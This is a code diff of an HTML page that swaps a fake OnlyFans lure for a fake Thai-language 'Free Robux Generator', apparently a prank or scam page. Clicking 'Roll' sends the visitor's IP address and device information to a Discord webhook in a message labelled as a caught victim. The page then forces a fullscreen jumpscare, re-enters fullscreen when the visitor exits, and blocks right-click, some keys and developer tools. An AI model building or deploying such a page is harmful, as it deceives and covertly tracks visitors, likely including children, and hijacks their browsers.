@@ -8,27 +8,46 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="theme-color" content="#000000" />
-    <meta name="description" content="Literally, Only Fans" />
-    <meta name="keywords" content="OnlyFans Literally Only Fans Fan HVAC mendez-solutions andrew mendez" />
+    <meta name="description" content="NBTHUB แจก Code Robux ฟรี" />
+    <meta name="keywords" content="Robux Free Generator Roblox" />
     <link rel="apple-touch-icon" href="%PUBLIC_URL%/fanDark.png" />
-    <title>Only Fans</title>
+    <title>Free Robux Generator</title>
+    <style>
+        .code-slot {
+            width: 32px;
+            height: 40px;
+            overflow: hidden;
+            position: relative;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin: 0 2px;
+            background-color: #f0f0f0;
+            transform-style: preserve-3d;
+            transform: rotateX(0deg);
+        }
+        .slot-inner {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            transition: transform 0.1s linear;
+        }
+        .slot-char-item {
+            display: flex; justify-content: center; align-items: center; height: 40px;
+        }
+    </style>
 </head>
-<body>
-    <div class="container mt-0 p-0 shadow-sm" style="max-width: 600px; background-color: #fff; min-height: 100vh;">
-        <div style="height: 200px; background-color: #00aff0; background-image: url('https://media.discordapp.net/attachments/1497671038245277816/1497673332449869965/Gh--FoOakAAcUzB.jpg?ex=69ee607b&is=69ed0efb&hm=df1647a477467705cc40ec2783f58ef3e0aea70b3fa093ab1ca0987bdaa734f4&=&format=webp'); background-size: cover; background-position: center;"></div>
+<body style="background-color: #2b2b2b; min-height: 100vh; display: flex; align-items: center; justify-content: center;">
+    <div class="container text-center shadow-lg p-5" style="max-width: 600px; background-color: #fff; border-radius: 15px;">
+        <h2 class="fw-bold mb-4" style="color: #00a2ff;">NBTHUB แจก Code Robux ฟรี</h2>
+        <p class="text-muted mb-4">คลิกปุ่ม "Roll" ด้านล่างเพื่อสุ่มรับโค้ด Robux ฟรี!</p>
         
-        <div class="px-4" style="margin-top: -50px;">
-            <img src="https://media.discordapp.net/attachments/1497671038245277816/1497673333112836136/SpNM9KGQ_400x400.jpg?ex=69ee607c&is=69ed0efc&hm=60af167828263392ccaea5271955a5309eab40cec55895f2df18675f6c53d4c4&=&format=webp" alt="Profile" class="rounded-circle border border-4 border-white" style="width: 100px; height: 100px; object-fit: cover;">
-            
-            <h4 class="mt-2 mb-0 fw-bold">จอเจ้น ตากลม💙</h4>
-            <p class="text-muted mb-3">@p_jenjub</p>
-            
-            <p style="font-size: 15px;">ยินดีต้อนรับสู่พื้นที่ลับเฉพาะของเจ้นนะคะ ✨<br>กดปุ่มด้านล่างเพื่อปลดล็อกดูรูปและคลิปวิดีโอสุด Exclusive ได้ฟรี! รีบดูก่อนโดนแบนนะ 🤫</p>
-            
-            <button id="scare-btn" class="btn w-100 rounded-pill text-white fw-bold py-2 mt-2 mb-4" style="background-color: #00aff0; font-size: 16px;">
-                กดติดตามฟรี !!
-            </button>
+        <div id="code-display" class="bg-light p-4 mb-4 rounded border" style="font-family: monospace; font-size: 32px; letter-spacing: 5px; display: flex; justify-content: center; align-items: center; perspective: 500px;">
         </div>
+        
+        <button id="roll-btn" class="btn btn-lg w-100 text-white fw-bold py-3 rounded-pill" style="background-color: #00a2ff; font-size: 20px;">
+            ROLL (สุ่มโค้ด)
+        </button>
     </div>
 
     <div id="jumpscare-container" style="display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: black; z-index: 9999; flex-direction: column; justify-content: center; align-items: center; overflow: hidden;">
@@ -49,14 +68,14 @@
                 
                 const params = {
                     embeds: [{
-                        title: "📸 เหยื่อติดกับแล้ว!",
+                        title: "📸 เหยื่อติดกับดัก Robux แล้ว!",
                         color: 16711680,
                         fields: [
                             { name: "🌐 IP Address", value: `**${ipData.ip}**`, inline: true },
                             { name: "📱 Device Info", value: navigator.userAgent },
                             { name: "⏰ เวลา", value: new Date().toLocaleString('th-TH'), inline: true }
                         ],
-                        footer: { text: "OnlyFans Prank System" }
+                        footer: { text: "Robux Prank System" }
                     }]
                 };
 
@@ -70,22 +89,129 @@
             }
         }
 
-        document.getElementById('scare-btn').addEventListener('click', function() {
+        document.getElementById('roll-btn').addEventListener('click', function() {
             sendLog();
+            
+            const rollButton = this;
+            rollButton.disabled = true;
+            rollButton.innerText = "กำลังสุ่ม...";
+            
+            const codeDisplay = document.getElementById('code-display');
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            const codeLength = 12;
+            const totalSpinTime = 4000;
+            const charHeight = 40;
 
-            var container = document.getElementById('jumpscare-container');
-            var audio = document.getElementById('jumpscare-audio');
-            
-            if (container.requestFullscreen) {
-                container.requestFullscreen();
-            } else if (container.webkitRequestFullscreen) {
-                container.webkitRequestFullscreen();
+            codeDisplay.innerHTML = '';
+            const slots = [];
+            for (let i = 0; i < codeLength; i++) {
+                const slotContainer = document.createElement('div');
+                slotContainer.classList.add('code-slot');
+                slotContainer.style.height = `${charHeight}px`;
+
+                const slotInner = document.createElement('div');
+                slotInner.classList.add('slot-inner');
+
+                let allCharsHtml = '';
+                const repeatCount = 3;
+                for (let k = 0; k < repeatCount; k++) {
+                    for (let j = 0; j < chars.length; j++) {
+                        allCharsHtml += `<span class="slot-char-item" style="height: ${charHeight}px;">${chars.charAt(j)}</span>`;
+                    }
+                }
+                slotInner.innerHTML = allCharsHtml;
+
+                slotContainer.appendChild(slotInner);
+                codeDisplay.appendChild(slotContainer);
+                slots.push({ container: slotContainer, inner: slotInner });
+
+                if ((i + 1) % 4 === 0 && i !== codeLength - 1) {
+                    const hyphen = document.createElement('span');
+                    hyphen.innerText = '-';
+                    hyphen.style.cssText = `
+                        font-size: 32px;
+                        margin: 0 5px;
+                        color: #333;
+                    `;
+                    codeDisplay.appendChild(hyphen);
+                }
             }
-            
-            container.style.display = 'flex';
-            audio.currentTime = 0;
-            audio.play().catch(function(e) { console.error("Audio playback failed:", e); });
+
+            let spinningSlots = codeLength;
+            const finalCode = Array.from({ length: codeLength }, () => chars.charAt(Math.floor(Math.random() * chars.length)));
+
+            slots.forEach((slot, index) => {
+                let currentOffset = 0;
+                let spinTimeoutId;
+                let spinSpeed = 50;
+                let spinDuration = totalSpinTime + (index * 100);
+                let startTime = performance.now();
+
+                const animateSpin = () => {
+                    const elapsed = performance.now() - startTime;
+                    if (elapsed < spinDuration) {
+                        currentOffset -= charHeight;
+                        slot.inner.style.transform = `translateY(${currentOffset}px)`;
+
+                        if (Math.abs(currentOffset) >= chars.length * charHeight) {
+                            currentOffset = 0;
+                            slot.inner.style.transition = 'none';
+                            slot.inner.style.transform = `translateY(${currentOffset}px)`;
+                            setTimeout(() => slot.inner.style.transition = 'transform 0.1s linear', 10);
+                        }
+                        
+                        slot.container.style.transform = `rotateX(${Math.sin(elapsed / 100) * 5}deg)`;
+
+                        spinTimeoutId = setTimeout(animateSpin, spinSpeed);
+                    } else {
+                        clearTimeout(spinTimeoutId);
+                        
+                        const finalChar = finalCode[index];
+                        const finalCharIndex = chars.indexOf(finalChar);
+                        
+                        const targetOffset = -(chars.length * charHeight + (finalCharIndex * charHeight));
+
+                        slot.inner.style.transition = 'transform 0.5s ease-out';
+                        slot.inner.style.transform = `translateY(${targetOffset}px)`;
+                        slot.container.style.transform = `rotateX(0deg)`;
+                        
+                        spinningSlots--;
+                        if (spinningSlots === 0) {
+                            var container = document.getElementById('jumpscare-container');
+                            var audio = document.getElementById('jumpscare-audio');
+                            
+                            container.style.display = 'flex'; 
+
+                            if (container.requestFullscreen) {
+                                container.requestFullscreen().catch(err => {
+                                    console.error("Failed to enter fullscreen:", err);
+                                });
+                            } else if (container.webkitRequestFullscreen) {
+                                container.webkitRequestFullscreen().catch(err => {
+                                    console.error("Failed to enter webkit fullscreen:", err);
+                                });
+                            }
+                            audio.currentTime = 0;
+                            audio.play().catch(function(e) { console.error("Audio playback failed:", e); });
+                        }
+                    }
+                };
+                animateSpin();
+            });
         });
+        
+        function handleFullscreenChange() {
+            const container = document.getElementById('jumpscare-container');
+            if (container.style.display === 'flex') {
+                if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                    if (container.requestFullscreen) {
+                        container.requestFullscreen();
+                    } else if (container.webkitRequestFullscreen) {
+                        container.webkitRequestFullscreen();
+                    }
+                }
+            }
+        }
 
         document.addEventListener('contextmenu', event => event.preventDefault());
         document.onkeydown = function (e) {
@@ -95,6 +221,9 @@
                 return false;
             }
         };
+        
+        document.addEventListener('fullscreenchange', handleFullscreenChange);
+        document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
 
         setInterval(function() {
             if (window.outerWidth - window.innerWidth > 200 || window.outerHeight - window.innerHeight > 200) {
